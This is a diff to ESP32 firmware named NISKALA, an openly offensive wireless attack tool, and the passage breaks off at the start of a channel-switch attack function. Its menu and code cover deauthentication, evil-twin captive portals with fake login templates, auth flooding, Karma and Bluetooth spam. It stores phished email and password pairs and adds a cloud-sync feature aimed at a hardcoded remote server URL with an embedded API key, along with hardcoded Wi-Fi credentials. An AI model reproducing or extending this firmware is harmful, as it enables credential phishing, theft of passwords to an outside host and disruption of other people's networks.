@@ -5,6 +5,10 @@
 #include <DNSServer.h>
 #include <WebServer.h>
 #include <Preferences.h>
+#include <ArduinoOTA.h>
+#include <HTTPClient.h>
+#include <BLEScan.h>
+#include <BLEAdvertisedDevice.h>
 
 #include "disclaimer.h"
 #include "attack_engine.h"
@@ -17,6 +21,9 @@ Preferences prefs;
 
 #define BTN_TOP 0
 #define BTN_BOTTOM 35
+#define BAT_PIN 34
+#define FW_VERSION "3.1"
+#define SYNC_API_KEY "niskala-secret-2026"
 
 const int MAX_VERIFY_ATTEMPTS = 5;
 const unsigned long VERIFY_TIMEOUT_MS = 6000;
@@ -28,6 +35,7 @@ enum State {
   AP_LIST_DEAUTH,
   AP_LIST_EVIL_TWIN,
   AP_LIST_AUTH_FLOOD,
+  AP_LIST_CSA,
   TEMPLATE_SELECT,
   DEAUTH_MENU,
   AUTH_FLOOD_RUNNING,
@@ -38,13 +46,20 @@ enum State {
   BT_SPAM,
   VIEW_PASSWORDS,
   KARMA_SCAN,
-  KARMA_RESULTS
+  KARMA_RESULTS,
+  CSA_RUNNING,
+  WEB_REMOTE,
+  OTA_MODE,
+  BLE_SCAN,
+  CLOUD_SYNC
 };
 State currentState = MAIN_MENU;
 
+#include "web_remote.h"
+
 int menuSelection = 0;
 int menuScrollPos = 0;
-const int MENU_COUNT = 9;
+const int MENU_COUNT = 14;
 const char* menuItems[] = {
   "DEAUTH MANUAL",
   "EVIL TWIN",
@@ -54,7 +69,12 @@ const char* menuItems[] = {
   "AUTH FLOOD",
   "BLUETOOTH SPAM",
   "PASSWORD",
-  "KARMA ATTACK"
+  "KARMA ATTACK",
+  "CSA ATTACK",
+  "WEB REMOTE",
+  "OTA UPDATE",
+  "BLE SCAN",
+  "CLOUD SYNC"
 };
 
 volatile AttackMode g_attackMode = ATK_IDLE;
@@ -64,12 +84,29 @@ volatile bool g_victimFound = false;
 uint8_t g_victimMAC[6] = {0};
 uint8_t g_targetBSSID[6] = {0};
 volatile uint8_t g_targetChannel = 1;
+char g_csaTargetSSID[33] = {0};
+
+// Parameter serangan runtime (diubah via Web Remote, disimpan di NVS)
+int cfg_deauth_burst = 5;
+int cfg_auth_burst = 20;
+int cfg_hop_interval_ms = 120;
+int cfg_beacon_hop_ms = 100;
+int cfg_deauth_reason = 0;
+String cfg_wifi_ssid = "Aksa Bintang";
+String cfg_wifi_pass = "MembanguN_5381";
+String cfg_server_url = "https://niskalasys.my.id/sync.php";
+String cfg_template_url = "https://niskalasys.my.id/template.html";
+String g_customTemplate = "";
+bool useCustomTemplate = false;
+int cfg_autosync_min = 0;
+unsigned long lastAutoSync = 0;
 
 unsigned long evilTwinStartTime = 0;
 
 ProbeEntry g_probeLog[PROBE_LOG_SIZE];
 volatile int g_probeLogHead = 0;
 volatile int g_probeLogCount = 0;
+portMUX_TYPE g_probeLogMux = portMUX_INITIALIZER_UNLOCKED;
 
 // Karma data
 KarmaSSIDEntry g_karmaSSIDs[KARMA_MAX_SSIDS];
@@ -92,6 +129,25 @@ bool isProbeRunning = false;
 bool isGlobalDeauthRunning = false;
 bool isAuthFloodRunning = false;
 bool isBTSpamRunning = false;
+bool isCSARunning = false;             // [CSA]
+bool isWebRemoteRunning = false;
+bool isOtaRunning = false;
+bool g_bleScanning = false;
+unsigned long g_bleScanStart = 0;
+
+#define BLE_SCAN_MAX 32
+struct BleScanEntry {
+  char mac[18];
+  char name[33];
+  int8_t rssi;
+  unsigned long lastSeen;
+  bool used;
+};
+BleScanEntry g_bleScanLog[BLE_SCAN_MAX];
+int g_bleScanCount = 0;
+bool transientActive = false;
+unsigned long transientUntil = 0;
+uint8_t transientMode = 0;
 String targetSSID = "";
 int apCount = 0;
 int selectedIdx = 0;
@@ -231,12 +287,41 @@ void drawMenuIcon(int idx, int x, int y, uint16_t color) {
       tft.drawLine(x+10, y+11, x+8, y+13, color);
       break;
     case 8:
-      // Karma icon: radar / spider web
       tft.drawCircle(x+7, y+7, 7, color);
       tft.drawCircle(x+7, y+7, 4, color);
       tft.fillCircle(x+7, y+7, 2, color);
       tft.drawLine(x+7, y, x+7, y+14, color);
       tft.drawLine(x, y+7, x+14, y+7, color);
+      break;
+    case 9:
+      tft.drawCircle(x+7, y+7, 7, color);
+      tft.drawLine(x+2, y+7, x+12, y+7, color);
+      tft.drawLine(x+7, y+2, x+7, y+12, color);
+      tft.drawLine(x+4, y+4, x+10, y+10, color);
+      tft.drawLine(x+10, y+4, x+4, y+10, color);
+      break;
+    case 10:
+      tft.drawRect(x+1, y+3, 10, 8, color);
+      tft.drawLine(x+11, y+5, x+13, y+7, color);
+      tft.drawLine(x+11, y+9, x+13, y+7, color);
+      tft.fillRect(x+3, y+5, 6, 4, color);
+      break;
+    case 11:
+      tft.drawLine(x+7, y+2, x+7, y+11, color);
+      tft.drawLine(x+3, y+6, x+7, y+2, color);
+      tft.drawLine(x+11, y+6, x+7, y+2, color);
+      tft.drawFastHLine(x+2, y+13, 10, color);
+      break;
+    case 12:
+      tft.drawCircle(x+7, y+7, 7, color);
+      tft.drawLine(x+7, y+7, x+12, y+4, color);
+      tft.drawLine(x+7, y+7, x+2, y+10, color);
+      break;
+    case 13:
+      tft.drawCircle(x+7, y+4, 3, color);
+      tft.drawCircle(x+7, y+4, 6, color);
+      tft.drawFastHLine(x+2, y+12, 10, color);
+      tft.drawLine(x+7, y+12, x+7, y+9, color);
       break;
   }
 }
@@ -266,15 +351,12 @@ void drawElegantSplash() {
   tft.fillScreen(TFT_BLACK);
   tft.setTextDatum(MC_DATUM);
   
-  // Dekorasi Garis Atas
   tft.drawFastHLine(30, 10, 180, TFT_DARKCYAN);
   tft.drawFastHLine(60, 12, 120, TFT_DARKCYAN);
   
-  // Judul Utama NISKALA dengan efek Glow
   tft.setTextFont(4);
   drawGlowText("N I S K A L A", 120, 35, TFT_GREEN, TFT_DARKGREEN);
   
-  // Tagline & Filosofi
   tft.setTextFont(1); 
   tft.setTextColor(TFT_CYAN, TFT_BLACK);
   tft.drawString("To be invisible is not to be absent", 120, 55);
@@ -282,25 +364,21 @@ void drawElegantSplash() {
   tft.setTextColor(TFT_YELLOW, TFT_BLACK);
   tft.drawString("Etika > Skill | Adab > Ilmu", 120, 68);
   
-  // Dekorasi Garis Bawah
   tft.drawFastHLine(30, 78, 180, TFT_DARKCYAN);
   tft.drawFastHLine(60, 80, 120, TFT_DARKCYAN);
 
-  // Progress Bar Loading
   int barX = 40, barY = 95, barW = 160, barH = 10;
   tft.drawRect(barX, barY, barW, barH, TFT_WHITE);
   
   for (int p = 0; p <= 100; p += 4) {
     tft.fillRect(barX+1, barY+1, (p*(barW-2))/100, barH-2, TFT_GREEN);
     
-    // Teks Loading
     tft.setTextFont(1); 
     tft.setTextColor(TFT_WHITE, TFT_BLACK);
     tft.drawString("Booting " + String(p) + "%", 120, 85);
     delay(15); 
   }
   
-  // Status Ready
   tft.setTextColor(TFT_CYAN, TFT_BLACK);
   tft.drawString("System Ready", 120, 115);
   
@@ -327,42 +405,52 @@ void drawScanAnimation(int frame) {
 // ═══════════════════════════════════════════════
 // Main menu
 // ═══════════════════════════════════════════════
+int readBatteryPercent() {
+  float v = (float)analogReadMilliVolts(BAT_PIN) / 1000.0f * 2.0f;
+  int pct = (int)((v - 3.3f) / (4.2f - 3.3f) * 100.0f);
+  if (pct < 0) pct = 0;
+  if (pct > 100) pct = 100;
+  return pct;
+}
+
+float readBatteryVoltage() {
+  return (float)analogReadMilliVolts(BAT_PIN) / 1000.0f * 2.0f;
+}
+
 void drawMainMenu() {
   tft.fillScreen(TFT_BLACK);
   String pwdCount = String(prefs.getInt("pwd_count", 0));
-  String uptime = String(millis() / 1000) + "s";
+  String statusRight = "BAT:" + String(readBatteryPercent()) + "% T:" + String((int)temperatureRead()) + "C P:" + pwdCount;
+
+  // Header
   tft.fillRect(0, 0, 240, 24, TFT_DARKGREEN);
   tft.setTextDatum(ML_DATUM); tft.setTextFont(2);
   tft.setTextColor(TFT_WHITE, TFT_DARKGREEN);
   tft.drawString("NISKALA", 8, 12);
   tft.setTextDatum(MR_DATUM); tft.setTextFont(1);
   tft.setTextColor(TFT_CYAN, TFT_DARKGREEN);
-  tft.drawString("PWD:" + pwdCount + " | " + uptime, 232, 12);
+  tft.drawString(statusRight, 232, 12);
   tft.drawFastHLine(0, 24, 240, TFT_CYAN);
   tft.setTextDatum(TL_DATUM);
 
-  tft.setTextFont(2);
-  const int VISIBLE = 4;
-  for (int i = 0; i < VISIBLE; i++) {
-    int idx = menuScrollPos + i;
-    if (idx >= MENU_COUNT) break;
-    int y = 28 + (i * 22);
-    if (idx == menuSelection) {
-      tft.fillRect(0, y, 240, 20, TFT_DARKGREEN);
-      drawCornerBrackets(2, y+1, 236, 18, TFT_GREEN);
-      tft.setTextColor(TFT_GREEN, TFT_DARKGREEN);
-    } else {
-      tft.fillRect(0, y, 240, 20, TFT_BLACK);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-    }
-    uint16_t iconColor = (idx == menuSelection) ? TFT_GREEN : TFT_DARKGREY;
-    drawMenuIcon(idx, 8, y + 3, iconColor);
-    tft.setCursor(24, y + 2);
-    tft.print(menuItems[idx]);
-  }
+  // Satu menu per layar (font besar)
+  int idx = menuSelection;
+  drawCornerBrackets(20, 42, 200, 66, TFT_GREEN);
 
-  if (menuScrollPos > 0) tft.fillTriangle(228, 26, 236, 26, 232, 22, TFT_CYAN);
-  if (menuScrollPos + VISIBLE < MENU_COUNT) tft.fillTriangle(228, 112, 236, 112, 232, 116, TFT_CYAN);
+  tft.setTextDatum(MC_DATUM);
+  String label = String(menuItems[idx]);
+  tft.setTextFont(4);
+  tft.setTextColor(TFT_GREEN, TFT_BLACK);
+  if (tft.textWidth(label, 4) > 200) {
+    tft.setTextFont(2);
+    tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  }
+  tft.drawString(label, 120, 76);
+
+  tft.setTextFont(2);
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+  tft.drawString(String(idx + 1) + " / " + String(MENU_COUNT), 120, 122);
+  tft.setTextDatum(TL_DATUM);
 
   drawFooter("ATAS: Pilih | BAWAH: OK");
 }
@@ -370,32 +458,74 @@ void drawMainMenu() {
 // ═══════════════════════════════════════════════
 // AP list
 // ═══════════════════════════════════════════════
+void drawSignalBars(int cx, int y, int rssi, uint16_t color) {
+  int pct = 0;
+  if (rssi > -60) pct = 4;
+  else if (rssi > -70) pct = 3;
+  else if (rssi > -80) pct = 2;
+  else if (rssi > -90) pct = 1;
+  for (int i = 0; i < 4; i++) {
+    int bh = 5 + i * 4;
+    int bx = cx - 14 + i * 8;
+    uint16_t c = (i < pct) ? color : TFT_DARKGREY;
+    tft.fillRect(bx, y + 20 - bh, 6, bh, c);
+  }
+}
+
+void drawBackIcon(int cx, int cy, uint16_t color) {
+  tft.drawLine(cx + 8, cy - 6, cx - 4, cy, color);
+  tft.drawLine(cx - 4, cy, cx + 8, cy + 6, color);
+  tft.drawFastHLine(cx - 8, cy, 16, color);
+}
+
+void drawTemplateIconBig(int idx, int cx, int cy, uint16_t color) {
+  if (idx == 5) {
+    tft.drawCircle(cx - 7, cy + 3, 6, color);
+    tft.drawCircle(cx + 1, cy - 1, 7, color);
+    tft.drawCircle(cx + 9, cy + 3, 6, color);
+    tft.drawFastHLine(cx - 8, cy + 8, 16, color);
+  } else {
+    tft.drawRect(cx - 9, cy - 7, 18, 14, color);
+    tft.drawFastHLine(cx - 9, cy - 3, 18, color);
+    tft.drawFastHLine(cx - 9, cy + 1, 18, color);
+  }
+}
+
 void drawAPList() {
   tft.fillScreen(TFT_BLACK);
   drawHeader("PILIH TARGET AP", TFT_NAVY);
-  tft.setTextFont(2);
-  for (int i = 0; i < 4; i++) {
-    int idx = apScrollPos + i;
-    if (idx > apCount) break;
-    int y = 28 + (i * 22);
-    if (idx == selectedIdx) {
-      tft.fillRect(0, y, 240, 20, TFT_NAVY);
-      drawCornerBrackets(2, y+1, 236, 18, TFT_CYAN);
-      tft.setTextColor(TFT_CYAN, TFT_NAVY);
-    } else {
-      tft.fillRect(0, y, 240, 20, TFT_BLACK);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-    }
-    tft.setCursor(10, y + 2);
-    if (idx < apCount) {
-      String ssid = WiFi.SSID(idx);
-      if (ssid.length() > 16) ssid = ssid.substring(0, 16);
-      tft.print(ssid);
-    } else if (idx == apCount) {
-      tft.print("<< KEMBALI");
-    }
+
+  int idx = selectedIdx;
+  tft.setTextDatum(MC_DATUM);
+
+  if (idx < apCount) {
+    int rssi = WiFi.RSSI(idx);
+    drawSignalBars(120, 30, rssi, TFT_CYAN);
+
+    String ssid = WiFi.SSID(idx);
+    if (ssid.length() > 12) ssid = ssid.substring(0, 12);
+
+    tft.setTextFont(4);
+    tft.setTextColor(TFT_CYAN, TFT_BLACK);
+    tft.drawString(ssid, 120, 68);
+
+    tft.setTextFont(2);
+    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+    tft.drawString("CH " + String(WiFi.channel(idx)) + "  |  " + String(rssi) + " dBm", 120, 100);
+  } else {
+    drawBackIcon(110, 46, TFT_GREEN);
+
+    tft.setTextFont(4);
+    tft.setTextColor(TFT_GREEN, TFT_BLACK);
+    tft.drawString("KEMBALI", 120, 68);
+
+    tft.setTextFont(2);
+    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
+    tft.drawString("ke menu utama", 120, 100);
   }
-  drawFooter("ATAS: Scroll | BAWAH: Pilih");
+
+  tft.setTextDatum(TL_DATUM);
+  drawFooter("ATAS: Pilih | BAWAH: OK");
 }
 
 // ═══════════════════════════════════════════════
@@ -404,20 +534,20 @@ void drawAPList() {
 void drawTemplateSelect() {
   tft.fillScreen(TFT_BLACK);
   drawHeader("PILIH TEMPLATE PORTAL", TFT_DARKCYAN);
+
+  int idx = templateSelection;
+  drawTemplateIconBig(idx, 120, 36, TFT_CYAN);
+
+  tft.setTextDatum(MC_DATUM);
+  tft.setTextFont(4);
+  tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  tft.drawString(getTemplateName(idx), 120, 68);
+
   tft.setTextFont(2);
-  for (int i = 0; i < TEMPLATE_COUNT; i++) {
-    int y = 32 + (i * 24);
-    if (i == templateSelection) {
-      tft.fillRect(0, y, 240, 22, TFT_DARKCYAN);
-      drawCornerBrackets(2, y+1, 236, 20, TFT_CYAN);
-      tft.setTextColor(TFT_CYAN, TFT_DARKCYAN);
-    } else {
-      tft.fillRect(0, y, 240, 22, TFT_BLACK);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-    }
-    tft.setCursor(20, y + 3);
-    tft.print(getTemplateName(i));
-  }
+  tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
+  tft.drawString(String(idx + 1) + " / " + String(TEMPLATE_COUNT), 120, 100);
+
+  tft.setTextDatum(TL_DATUM);
   drawFooter("ATAS: Pilih | BAWAH: OK");
 }
 
@@ -506,24 +636,77 @@ void drawBeaconSpam(int frame) {
   drawFooter("TEKAN TOMBOL = STOP");
 }
 
+// [FIX] snapshot probe log dengan critical section
+const char* vendorFromMacBytes(const uint8_t* m) {
+  uint32_t oui = ((uint32_t)m[0] << 16) | ((uint32_t)m[1] << 8) | m[2];
+  switch (oui) {
+    case 0xACBC32: case 0x8C8590: case 0xF01898: case 0x308D99: case 0x3C22FB:
+      return "Apple";
+    case 0x8C0D76: case 0xCC07AB: case 0x3C64EA:
+      return "Samsung";
+    case 0x640980: case 0x7811DC: case 0xF0B429: case 0x8C4B14:
+      return "Xiaomi";
+    case 0x00E0FC: case 0x286ED4: case 0xD80BCB:
+      return "Huawei";
+    case 0x546009: case 0x3C5AB4:
+      return "Google";
+    case 0x0050F2: case 0x2816A8:
+      return "Microsoft";
+    case 0x001302: case 0x340286:
+      return "Intel";
+    case 0x50C7BF: case 0xA42BB0:
+      return "TP-Link";
+    case 0x502B98: case 0x086438:
+      return "Realme";
+    case 0x08D46A: case 0x702C1F:
+      return "Oppo";
+    case 0x241177: case 0x7802F8:
+      return "Vivo";
+    case 0x0024BE: case 0x405BAD:
+      return "Sony";
+    case 0x0C8BFD: case 0xE05B70:
+      return "OnePlus";
+    case 0x0015EB: case 0x286C07:
+      return "ZTE";
+    default:
+      return "Unknown";
+  }
+}
+
+const char* vendorFromMacStr(const char* macStr) {
+  int a[6] = {0};
+  sscanf(macStr, "%x:%x:%x:%x:%x:%x", &a[0], &a[1], &a[2], &a[3], &a[4], &a[5]);
+  uint8_t m[6] = {(uint8_t)a[0], (uint8_t)a[1], (uint8_t)a[2], (uint8_t)a[3], (uint8_t)a[4], (uint8_t)a[5]};
+  return vendorFromMacBytes(m);
+}
+
 void drawProbeSniff(int frame) {
   tft.fillScreen(TFT_BLACK);
   drawHeader("PROBE SNIFFER", TFT_DARKCYAN);
   tft.setTextFont(1); tft.setTextColor(TFT_CYAN, TFT_BLACK);
-  tft.setCursor(4, 28); tft.print("MAC ADDR          RSSI  SSID");
-  int count = g_probeLogCount, head = g_probeLogHead;
-  int show = (count < 4) ? count : 4;
+  tft.setCursor(4, 28); tft.print("VENDOR    HIT  RSSI  SSID");
+
+  ProbeEntry snapshot[4];
+  int count, show;
+  portENTER_CRITICAL(&g_probeLogMux);
+  count = g_probeLogCount;
+  int head = g_probeLogHead;
+  show = (count < 4) ? count : 4;
   for (int i = 0; i < show; i++) {
     int idx = (head - show + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
+    snapshot[i] = g_probeLog[idx];
+  }
+  portEXIT_CRITICAL(&g_probeLogMux);
+
+  for (int i = 0; i < show; i++) {
     tft.setTextColor(TFT_WHITE, TFT_BLACK);
     tft.setCursor(4, 40 + (i * 18));
     char buf[64];
-    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X  %4d  %s",
-      g_probeLog[idx].mac[0], g_probeLog[idx].mac[1],
-      g_probeLog[idx].mac[2], g_probeLog[idx].mac[3],
-      g_probeLog[idx].mac[4], g_probeLog[idx].mac[5],
-      g_probeLog[idx].rssi,
-      g_probeLog[idx].ssid[0] ? g_probeLog[idx].ssid : "(hidden)");
+    snprintf(buf, sizeof(buf), "%-8.8s %3d %4d  %s",
+      vendorFromMacBytes(snapshot[i].mac),
+      snapshot[i].count,
+      snapshot[i].rssi,
+      snapshot[i].ssid[0] ? snapshot[i].ssid : "(hidden)");
     tft.print(buf);
   }
   if (count == 0) {
@@ -541,9 +724,9 @@ void drawBTSpam(int frame) {
   drawHeader("BLUETOOTH SPAM", TFT_BLUE);
   tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
   tft.setCursor(10, 30); tft.print("Mode: ");
-  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println("APPLE BLE");
+  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.println("MULTI VENDOR");
   tft.setCursor(10, 52); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Payload: ");
-  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println("3 rotasi");
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.println("8 rotasi");
   tft.setCursor(10, 74); tft.setTextColor(TFT_GREEN, TFT_BLACK);
   tft.print("Broadcasting BLE");
   for (int i = 0; i < (frame % 4); i++) tft.print(".");
@@ -553,6 +736,46 @@ void drawBTSpam(int frame) {
   tft.drawLine(bx+8, by+5, bx+8, by+15, TFT_BLUE);
   tft.drawLine(bx+8, by+15, bx, by+10, TFT_BLUE);
   if (frame % 4 < 2) tft.fillCircle(bx+14, by+10, 2, TFT_CYAN);
+  drawFooter("TEKAN TOMBOL = STOP");
+}
+
+// ═══════════════════════════════════════════════
+// CSA UI  [PATCH 2]
+// ═══════════════════════════════════════════════
+void drawCSARunning(int frame) {
+  tft.fillScreen(TFT_BLACK);
+  drawHeader("CSA ATTACK", TFT_ORANGE);
+  tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, 26); tft.print("Target: ");
+  tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  String s = targetSSID; if (s.length() > 16) s = s.substring(0, 16);
+  tft.println(s);
+
+  tft.setCursor(10, 46); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Ch asli: ");
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.print(g_targetChannel);
+
+  tft.setCursor(10, 66); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Paket: ");
+  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println(g_packetsSent);
+
+  tft.setCursor(10, 86); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Korban: ");
+  if (g_victimFound) {
+    tft.setTextColor(TFT_GREEN, TFT_BLACK);
+    char buf[24];
+    snprintf(buf, sizeof(buf), "%02X:%02X:%02X...",
+             g_victimMAC[0], g_victimMAC[1], g_victimMAC[2]);
+    tft.println(buf);
+  } else {
+    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
+    tft.println("scanning");
+  }
+
+  int cx = 205, cy = 90;
+  const char* spin = "|/-\\";
+  tft.setTextColor(TFT_ORANGE, TFT_BLACK);
+  tft.setCursor(190, 90);
+  tft.print("CH ");
+  tft.print(spin[frame % 4]);
+
   drawFooter("TEKAN TOMBOL = STOP");
 }
 
@@ -692,7 +915,11 @@ void drawViewPasswords() {
       tft.print(status);
       tft.setCursor(5, y + 14);
       tft.setTextColor(TFT_YELLOW, (idx == viewSelection) ? TFT_DARKCYAN : TFT_BLACK);
-      tft.print(pass.substring(0, 15));
+      tft.print(pass.substring(0, 12));
+      unsigned long ts = prefs.getULong(("pwd_ts_" + String(idx)).c_str(), 0);
+      tft.setTextColor(TFT_DARKGREY, (idx == viewSelection) ? TFT_DARKCYAN : TFT_BLACK);
+      tft.setCursor(150, y + 14);
+      tft.print(String(ts / 1000) + "s");
     }
   }
   int yDel = 85;
@@ -742,7 +969,6 @@ void drawKarmaScan(int frame) {
   tft.setCursor(10, 60); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.print("Response: ");
   tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.println((uint32_t)g_karmaResponses);
 
-  // Radar animation
   int cx = 200, cy = 55;
   for (int i = 0; i < 3; i++) {
     int r = (frame * 3 + i * 10) % 25;
@@ -750,12 +976,10 @@ void drawKarmaScan(int frame) {
   }
   tft.fillCircle(cx, cy, 2, TFT_PINK);
 
-  // Live top 3 SSIDs
   tft.drawFastHLine(0, 78, 240, TFT_DARKGREY);
   tft.setTextFont(1); tft.setTextColor(TFT_CYAN, TFT_BLACK);
   tft.setCursor(4, 80); tft.print("TOP SSID (live):");
 
-  // Sort for display
   KarmaSSIDEntry temp[KARMA_MAX_SSIDS];
   memcpy(temp, g_karmaSSIDs, sizeof(temp));
   for (int i = 0; i < g_karmaSSIDCount - 1; i++) {
@@ -836,8 +1060,21 @@ void savePasswordToNVS(String email, String pass) {
   int count = prefs.getInt("pwd_count", 0);
   if (count < MAX_SAVED_PWDS) {
     prefs.putString(("pwd_" + String(count)).c_str(), email + "|" + pass);
+    prefs.putULong(("pwd_ts_" + String(count)).c_str(), millis());
     prefs.putInt("pwd_count", count + 1);
   }
+}
+
+void deletePasswordEntry(int idx) {
+  int total = prefs.getInt("pwd_count", 0);
+  if (idx < 0 || idx >= total) return;
+  for (int i = idx; i < total - 1; i++) {
+    prefs.putString(("pwd_" + String(i)).c_str(), prefs.getString(("pwd_" + String(i + 1)).c_str(), ""));
+    prefs.putULong(("pwd_ts_" + String(i)).c_str(), prefs.getULong(("pwd_ts_" + String(i + 1)).c_str(), 0));
+  }
+  prefs.remove(("pwd_" + String(total - 1)).c_str());
+  prefs.remove(("pwd_ts_" + String(total - 1)).c_str());
+  prefs.putInt("pwd_count", total - 1);
 }
 void updatePasswordVerification(bool ok) {
   int count = prefs.getInt("pwd_count", 0);
@@ -857,10 +1094,27 @@ void deleteAllPasswordsFromNVS() {
   viewSelection = 0; viewScrollPos = 0;
 }
 
+void saveConfig() {
+  prefs.putInt("cfg_deauth", cfg_deauth_burst);
+  prefs.putInt("cfg_auth", cfg_auth_burst);
+  prefs.putInt("cfg_hop", cfg_hop_interval_ms);
+  prefs.putInt("cfg_beacon", cfg_beacon_hop_ms);
+  prefs.putInt("cfg_reason", cfg_deauth_reason);
+  prefs.putString("wifi_ssid", cfg_wifi_ssid);
+  prefs.putString("wifi_pass", cfg_wifi_pass);
+  prefs.putString("srv_url", cfg_server_url);
+  prefs.putString("tpl_url", cfg_template_url);
+  prefs.putInt("autosync", cfg_autosync_min);
+}
+
 // ═══════════════════════════════════════════════
 // Web handlers
 // ═══════════════════════════════════════════════
 void handleRoot() {
+  if (isWebRemoteRunning) {
+    server.send_P(200, "text/html", HTML_REMOTE);
+    return;
+  }
   if (verifyState == 2) {
     server.send_P(200, "text/html", HTML_SUCCESS);
     return;
@@ -874,7 +1128,11 @@ void handleRoot() {
     server.send_P(200, "text/html", HTML_VERIFYING);
     return;
   }
-  server.send_P(200, "text/html", getTemplate(selectedTemplateIdx));
+  if (useCustomTemplate && g_customTemplate.length() > 0) {
+    server.send(200, "text/html", g_customTemplate);
+    return;
+  }
+  server.send_P(200, "text/html", getTemplateForHost(server.hostHeader(), selectedTemplateIdx));
 }
 
 void handleLogin() {
@@ -897,8 +1155,16 @@ void handleLogin() {
 }
 
 void handleNotFound() {
-  server.sendHeader("Location", "http://192.168.4.1/", true);
-  server.send(302, "text/plain", "");
+  if (isWebRemoteRunning) {
+    server.sendHeader("Location", "http://192.168.4.1/rc", true);
+    server.send(302, "text/plain", "");
+    return;
+  }
+  if (useCustomTemplate && g_customTemplate.length() > 0) {
+    server.send(200, "text/html", g_customTemplate);
+    return;
+  }
+  server.send_P(200, "text/html", getTemplateForHost(server.hostHeader(), selectedTemplateIdx));
 }
 
 // ═══════════════════════════════════════════════
@@ -914,7 +1180,6 @@ void applyPromiscuousFilter(bool probeOnly) {
 
 // ── Karma ──
 void startKarmaScan() {
-  // Reset data
   memset(g_karmaSSIDs, 0, sizeof(g_karmaSSIDs));
   memset(g_karmaClients, 0, sizeof(g_karmaClients));
   g_karmaSSIDCount = 0;
@@ -924,7 +1189,6 @@ void startKarmaScan() {
 
   WiFi.mode(WIFI_AP_STA);
   delay(200);
-  // AP tersembunyi untuk Karma Scan (hidden=1)
   WiFi.softAP("Karma_Scan", NULL, 1, 1, 8);
   delay(300);
 
@@ -950,8 +1214,13 @@ void stopKarmaScan() {
 void startDeauthEngine() {
   if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
   uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
-  if (memcmp(mac, g_targetBSSID, 6) != 0) { esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID); delay(50); }
-  // AP tersembunyi (hidden=1)
+  if (memcmp(mac, g_targetBSSID, 6) != 0) {
+    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
+    if (macErr != ESP_OK) {
+      Serial.printf("[WARN] set_mac failed (%d), pakai MAC existing\n", macErr);
+    }
+    delay(50);
+  }
   WiFi.softAP("Deauther_Fix", "12345678", 1, 1); delay(400);
   applyPromiscuousFilter(false);
   esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
@@ -975,8 +1244,13 @@ void stopDeauthEngine() {
 void startAuthFlood() {
   if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
   uint8_t mac[6]; esp_wifi_get_mac(WIFI_IF_AP, mac);
-  if (memcmp(mac, g_targetBSSID, 6) != 0) { esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID); delay(50); }
-  // AP tersembunyi (hidden=1)
+  if (memcmp(mac, g_targetBSSID, 6) != 0) {
+    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
+    if (macErr != ESP_OK) {
+      Serial.printf("[WARN] set_mac failed (%d)\n", macErr);
+    }
+    delay(50);
+  }
   WiFi.softAP("AuthFlood", "12345678", 1, 1); delay(300);
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
@@ -995,7 +1269,6 @@ void stopAuthFlood() {
 
 void startGlobalDeauth() {
   if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
-  // AP tersembunyi (hidden=1)
   WiFi.softAP("Global_Deauth", "12345678", 1, 1); delay(300);
   esp_wifi_set_promiscuous(false);
   g_packetsSent = 0;
@@ -1012,7 +1285,6 @@ void stopGlobalDeauth() {
 
 void startBeaconSpam() {
   WiFi.mode(WIFI_AP);
-  // AP tersembunyi (hidden=1)
   WiFi.softAP("Beacon_Init", "12345678", 1, 1); delay(300);
   esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
   esp_wifi_set_promiscuous(false);
@@ -1030,9 +1302,10 @@ void stopBeaconSpam() {
 
 void startProbeSniffer() {
   if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
-  // AP tersembunyi (hidden=1)
   WiFi.softAP("Probe_Sniff", "12345678", 1, 1); delay(200);
+  portENTER_CRITICAL(&g_probeLogMux);
   g_probeLogHead = 0; g_probeLogCount = 0;
+  portEXIT_CRITICAL(&g_probeLogMux);
   applyPromiscuousFilter(true);
   esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
   esp_wifi_set_promiscuous(true);
@@ -1061,17 +1334,395 @@ void stopBTSpam() {
   WiFi.mode(WIFI_STA);
 }
 
-// ── Evil Twin ──
+// ── CSA  [PATCH 2] ──
+void startCSAAttack() {
